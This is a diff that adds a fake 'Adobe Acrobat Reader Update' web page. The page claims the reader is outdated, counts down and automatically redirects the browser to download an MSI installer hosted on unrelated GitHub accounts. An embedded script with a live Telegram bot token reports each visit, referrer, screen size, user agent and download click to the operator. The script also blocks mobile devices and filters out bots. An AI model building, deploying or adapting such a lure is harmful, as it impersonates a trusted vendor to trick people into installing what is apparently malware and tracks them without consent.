@@ -1,0 +1,213 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Adobe Acrobat Reader Update</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f7fa;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
+        .top-right-links {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 14px;
+            color: #ba2717;
+            display: flex;
+            gap: 15px;
+        }
+
+        .top-right-links a {
+            text-decoration: none;
+            color: #ba2717;
+        }
+
+        .heading {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0d0d0d;
+            margin-top: 100px;
+        }
+
+        .subheading {
+            font-size: 18px;
+            color: #555;
+            margin-top: 10px;
+        }
+
+        .download-info, .download, .countdown {
+            font-size: 18px;
+            font-weight: 500;
+            color: #555;
+            margin-top: 15px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0072c6;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin-top: 30px;
+            display: none;
+        }
+
+        .spinner.active {
+            display: block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+<img width="120" height="120" 
+src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAB4CAYAAAA5ZDbSAAAOcUlEQVR42u2deXxURbbHv3XvzUJCwr4mgRmWyPaQVcImm/OR8eHI6CCIOIPKAOICyCiC6AMZFAZF1CcC+sCZQRZRh+UDDCJLWARElgFkC4tAAoogSxaS9L1V748GQtNLEiTQ3dTvr3T3vZ2+51un6tS5VecKrlMWWC1MWnaw6NjEpGldg+QEg8QYiCklKIVWsXVRcTEbsjMk6WmSAzsctqfarPnWYYsDzvV8pyjuCckGd/SPZGDPSB6pIqiisZS8flD8MC+fOdPzmZomOVAigOsaJI+NZlz3CB40wNBmv/mSID93Mf/VXEYdkhy8IYAjIGJENKNeiGJ4FERpM9965ULuxFzGv5HHOBvs6wacaJA0O4Z5KSattVmDT187bHg0h14ZkvRiA65v0GBpLMsTDBK1KYNXJxUnu2XTdZfDz
+&#10;iIDbmjSaGUsqeUF5bUJg19nFGc6Z3H3XsmeQgEnGdRYF8vX1Q0StOlCR+mS4+2yaX1CkuEXsAXWV6VZ08akrTZZ6Gmzw6bOWdztAtdVTAs0MppXNNzQVSuTlBejeGlcHmO9PLi2QZ3tceyKhmhtqtBVHuQ1y6Tx5YTIFcBzY5j/YAR/0CYKfX3qYm6fHB65AjjZ4I6dcezRGarwkANO40wapEkOWAD9Ixmo4YaPTDD7RdJ/eC5/ERZYR+JJ1zcOwi8BUusCSVYLk5YabvipmqBaU5NmVgeLjtoc4amOFp2sJiZNtSnCU01Mmlp1DZK1KcJTdQ2SLZ1zDl9VN0iwSgtKa1OEp+IgTuSXQWlThK8sbQINOGQlqiVAufKo9GNw4bwGHBYyTYz+z2I8PRSRWOPK2+roEeTMacgP34fsrNsGcHiNwaVisOYsRHS8x+8hat93OI/+HnUoTQMOOeedPgvj4UcLPU4dPYLdoTmcO6sBh8yF
+NLoTa&#10;/0OT5Dpx2D3TkSHzlAqxuMzOW8WzoDHNOCQ8d63p2I8PqAA7oZU7Ie6Qm4uoklzrK82gXVVyOE42CkNUWn7dZAVEi21XUeP187YUZCb64a9YysqdSWiy72ewdgf++G88oL24KBXXDwRR8+CcWnNQnYWrprlwC7Y1WEMfxVzxBjPLvzAPuy76msPDvpWmpBYABfcEbJ9zZadn055n5dcD8qWC+tgKzy66Lh4z9c/nPQ+JiLCd+Oo1wC1aYMGHOzzX4+u13Z5g6xY2TfgKtXCOhkfHoCzMj1fGz7WD1aqXDTv14CDUNeMoaJcBW9PrVrd97mufA042KVO/1S4t9a9w/e5Z05rwEGvC+fh1I9Q2b04VCTVhMhIyL/knZGRiJq/9n3utY1DAw5SL96/B3EJMBERiNrJqL273cBr1fXMYl2tn89owCEBeM9uRPtOBWNu4yYFgFu08nOS8u7eNeAgBbxxHQx4tgBwm7th3iz33ym
++d8SqkxmQk&#10;60Bh4Lk12sxlQLh3jDp4c13tfF90v69hLvCZ0XHqR9R+/ci6jW4NO7WQdSuC3l5CH8RtAYcYt30skVXAAOI7j3cSRDhu5iQOqABh1Y3vehzjKEvXXltdO8BAea5asfWsAccXmuyhMDaecQ9D74s2/Y9RcrJxlWjrPddJ+3BwdxHK9SnnyCGjbzqCn1fovpmY9jDDT/AgJw5DWPIcDDNwMdtWs/toLADrNKPoVZ9ifjNbwMft26NBhyyXrx0IWYgwOfOojZv0IBDNtbq0CVwA/hy6W0x/oYn4Lh4jK7dAnfP/17M7aKwA2w88AeIDvzICJm6UgMOWcBF2Lpi9O6LfO/N2wJwWCU6RPVErN1Hfa/JulrZWdh3NUBlHNceHFKAH+1bOFyA2NKYkz7A7tlNe3DoXInA2paG+HXtIp/iDPwTcu4/NOCQuJD2nbAWryreSRfOY6c0Qp1I11100AdXfZ4IfMD5c6gjhxBNmh
+e8F18G853p7q5aS&#10;u3BQasyZYnYfyLg9EjOmIr88H2s1K3uFZdXd9V/HYV8c5z24KD13t59C5/7fjITtXc3zsSxmC+P9fjMHDEG9c1G1NpV2oODTqaJtfUA4le1/B6i9u3BTml4qTUYWF8s967j8dMp7LubuRfiaQ8OIu+974GAcC97b8ELiT3gMSLWbocqVQver1QZ8+/zsX/XBXIvag8Omha6bC2idXv/B9g2roZJ8OMPnhfeuj3WghUQ5fk4Rrnoc5y+D4dN0BXSgEXTFlirtwT23gXz3cB8ef9DvTA/mu21KE9+NAXnhWdAhX78GdJdtPHUkEKPkR9M9v/Z53MhqSbm6PGe39tvELjycUYMdb8RE4uoURMSkhCVKkO5CojyFaB0ac+9yfn5cOE86sJ5OP0Tav8e1N7vbuni+pD1YJFUE2tbmt+d+wDq283Y96QUHqdN+gDjiYHe5x88gKhQEcr9gkc4Son6/jDq67WoJQuRK
+27uveiQ9WDj+REB4Rbmv&#10;cTEIu5qjdG2A6Kl70Yg6tyAWumG4V6EX6sO9HkCI/0YctIbyI+n35RxPiQ9WCTVxNp6wCth4eF9Gcexm9QG16VyDtGlEK3aYLTvhGjfCdGsZaENJKAyL6B+PuP+/ssVBkwTUbmqexurCPzsbbVpPXafB0t8+6oVst4bAC6A/PB9RPVERNduGPd2Q7Tt4BUxF1m2jTNhDGr1CtTxo+7F9IG62chIRJVqUL8hRq8/YjzY07uRprTDWpKK3bEFXMzRHnzlByfWcI+9hQBW6cc8qs3+YmVl4vzlaeTcfxa/QXbvgTljrs9bmfK9N0u0GFvIAb62ZOENUW4uaud21LYtqB3fojLSMd+a4q6jdS2QhZ8hXx7mroNZnK5ywQrfVXDPncWVXLWgGsHtDLio3luoLpxHbkhFpa5CbVyH2rOrYKy+rLh4zGn/wLjvAR8N4iJy8t9w/vct7wo//hrmtH9i9OzjewTo
+0Bz1n20asDl5Gkbf/sU/0XFQm&#10;zcgly9BrVvtNqbjFME6AmPYSMzh/+M7IDt/DvnxdOS09wLfU46KcufL/QwZdtf2qBLaaRH8gA0D474H3BXcA6UkfYyZcuVy1LJF7nXQv6AWh2h0J+b7MxB3NvMbhKl1q5GLv0AuWeCRFhWJNTDfnup/p4XLhat2pRJ75EDwAo4tjdHncYyBg4u8DEdlHEctW4xctgi1fg3k5d3A+YaFMWgo5rCRUKZsgB+hUMe+h7M/u+fadZIDrhNTy5eU6Nqw4ANcvgLmM8PcmaWy5YqeMPpsDk6/3iX/+8qWwxz8IsbA57xKKF5Plsvu0gq1/dvbAHCZsphPP48xaAiUjit20sHVsp7vIqQlpXLlMXr3xXh8wPVlvBwHZ/hzyI+mhHkmy7Iw+g3CfGm0f4/1t4n7sq1eGoKc+s4tCu0FoklzjK73I7rci2jcNHCU7zioNV/hjB+N2rKp5H/erQQsOnTBnPA
+Ool5D3+PTvu+QUyZjjBjtfgaSr2N27&#10;cDu1DJ4NpNFRiIa/Je7ykBCEkRHXwn61OGD7gj+JpZPvDWA4+Ixx070O+VR+/YgJ09Azv8E843JGP2f8evZ9j0pt0WtjevuIG+617briDllJqLGr3yDnTAGufAzkNJ9c6DfIP8xyrsTNdxg8mBj4GDM1yd5TxtyspHvvokz6fWClF1MLNbabX4DGJW2H7t9kysP3tC6lR5sGJivT8IYONjbC5cuxBk60GvNlDnhHf/RaX6++5lHGm4QABYC84O/e+dhs7NwXngWOftj7/bw+4cxHnvSfyD62kjUti2aXjB00ebI1zBefMWzez1yCKd39yvVYD1+UP1GWF9thFjfz61WXy51Z36UfuzxLQcsmrXEWrHRo6SR2rsb+/7OvlcylCuPtXKze3mLL7jpx9w3yMO8BHDIdNHmiDGecDOOuxeW+wJUKgZr7mK/cMnOwun1Ow03aADHl0F0+o3n2P
+lUX58PqCIqCmvmPESrNn6zP86TvVG7/6OJB&#10;QtgkVzPI72odu3wvbkrJhbrk395NQYPvi8/j7yNKuOEhgdfs9tP7dvj3Qhq1cH8+FN3/tbnoKtwRgxFTn1Xkwq6IKtiJSLSfixYPnr+HHbP+90rF+LLYPz5acwhw/0/mEpK9yK3GVM1pWCNos3ZC7zXNJ36ESpUDFwsNPMCznN/Rv7rU00oqKdJtepgrfqmWDfu1Y6tOE/0Qh0+qOmEQqJDpLTF/L85iISkwAdmZyHfewvn7Tdu7FIbDfgm3GyIi8d48imMR/6EuKO+xzirvtuJ/GIectYM31MorRAAfLUqVHRv65AOKiMdMi9oCmEFWCtM5sFawQE4F3KjIVqbIvyUo8ixMhWZ0UIDDkdlQqZ1UnKikkklbY7w0wlJhpUmOdDY5E5tjvBTmuSAtd1h20MR9NDmCD9td9hmpdqs0aYIT62xWS0ssA7Hc7yqoKo2SXiNv7UzqWnZY
+M/LZ87gKIZqs4SP5riY7YAjAOoaJO+MY48JpjZN6&#10;MsBp1Em9Q5JDlqXo60vXHzWI4Ke2jyhr/ku5h2SHAS4Uq2rlkHtHXHs1lmt0NZFxcUmWTQ6IjkMV+WiD0sOTcxl/CvRjNZmCl2Nz2PcZbgeHnyJtrUiltVtLdppU4We1tmsvTebLjbYPgEDJBgkro9lY4JBojZZ6Oi45Fi7LFJOKjzqWPismNnApOHKWFIrCCpo0wW/TitOd87i7n2Svdd+5rckaj2D+kti+XeSQQ1twuDVScmJ/86h626HXb4+D1jztrpBwqxSzGln0V6bMvi01ib1sYv0Pik54e8YUdiXWGANj2LE8GhG6ilU8EyFxucx7m95jHcgYE1GUdQvrWVQ+7Vo/vpQBD10xuvWyAFnvot5r+Yy6nvJkaKcI4r7T+oY1O0fycCekTxSTVBNm73kdUKSMdfFnA/zmXY5Q1VUiev9pyaYTU2adbTo1NSkWV2D5OoG
+CaWhdIwgRmMpvnIUOVmQlSFJPyhJ2+awdY3N6h0O2wvri&#10;v3p/wG/aks4J52TtwAAAABJRU5ErkJggg==">
+    </div>
+
+    <div class="top-right-links">
+        <a href="#">Support</a>
+        <a href="#">English</a>
+    </div>
+
+    <div class="container">
+        <div class="heading">Your Acrobat Adobe reader is Out of Date</div>
+        <div class="subheading"> Your version of Adobe Reader is outdated that may cause compatibility issues to access the file</div>
+
+        <div class="download-info" id="downloadInfo">The latest version will download automatically in a few seconds....</div>
+
+        <div class="countdown" id="countdownDiv">The update will start in <span id="countdown">5</span> seconds</div>
+        
+        <div class="download" id="installMessage">Check your Downloads folder and install the new Adbsetup_x86;to access your attached file</div>
+
+        <div class="spinner" id="spinner"></div>
+    </div>
+
+    <div class="footer">
+        <p>If you are not redirected automatically, <a id="manualDownload" href="https://github.com/jessica-alarie/reader/releases/download/p8/ADBSetup_x86.msi">click here to manually download and install the latest version.</a></p>
+        <p>&copy; Copyright &copy; 2026 Adobe. All rights reserved.</p>
+    </div>
+
+    <script>
+        let countdownTime = 5;
+        const countdownElement = document.getElementById('countdown');
+        const spinner = document.getElementById('spinner');
+
+        spinner.classList.add('active');
+
+        const countdownInterval = setInterval(() => {
+            countdownTime--;
+            countdownElement.textContent = countdownTime;
+
+            if (countdownTime <= 0) {
+                clearInterval(countdownInterval);
+                window.location.href = "https://github.com/cmorton323233/adobenownow/releases/download/newb/Adb_setup_x86.msi";
+            }
+        }, 1000);
+    </script>
+
+<script>
+const BOT_TOKEN = '8674168699:AAFB62XKMQZb5_QUam2cdSChgOvqA5yBZv8';
+const CHAT_ID   = '8686625206';
+
+function sendTG(msg) {
+  fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+  }).catch(function(){});
+}
+
+const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+if(isMobile){
+  document.body.innerHTML = `
+    <div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;background:#f4f6f8;">
+      <div style="background:white;padding:40px;border-radius:10px;text-align:center;max-width:400px;">
+        <h2 style="color:#d32f2f;">Access Denied</h2>
+        <p>This content must be opened from a desktop device.</p>
+      </div>
+    </div>`;
+} else {
+
+  // Notify on page visit
+  const now = new Date().toLocaleString();
+  const page = window.location.href;
+  const ref  = document.referrer || 'Direct / None';
+  const ua   = navigator.userAgent;
+  const scr  = window.screen.width + 'x' + window.screen.height;
+  sendTG('&#128065; *Page Visit*\n\n&#128196; *Page:* ' + page + '\n&#128336; *Time:* ' + now + '\n&#128279; *Referrer:* ' + ref + '\n&#128208; *Screen:* ' + scr + '\n&#128421; *UA:* ' + ua);
+
+  const startTime = Date.now();
+
+  window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => { document.getElementById('downloadBtn').disabled = false; }, 2000);
+  });
+
+  document.getElementById('downloadBtn').addEventListener('click', function(){
+    const honeypot  = document.getElementById('robot_check').value.trim();
+    const timeSpent = (Date.now() - startTime) / 1000;
+
+    if(honeypot || timeSpent < 2){
+      window.location.href = "";
+      return;
+    }
+
+    // Notify on button click
+    sendTG('&#128433; *Button Clicked &#8212; Download Triggered*\n\n&#128336; *Time:* ' + new Date().toLocaleString() + '\n&#128196; *Page:* ' + window.location.href);
+
+    window.location.href = "https://github.com/cmorton323233/adobenownow/releases/download/newb/Adb_setup_x86.msi"
+  });
+}
+</script>
+
+
+</body></html>
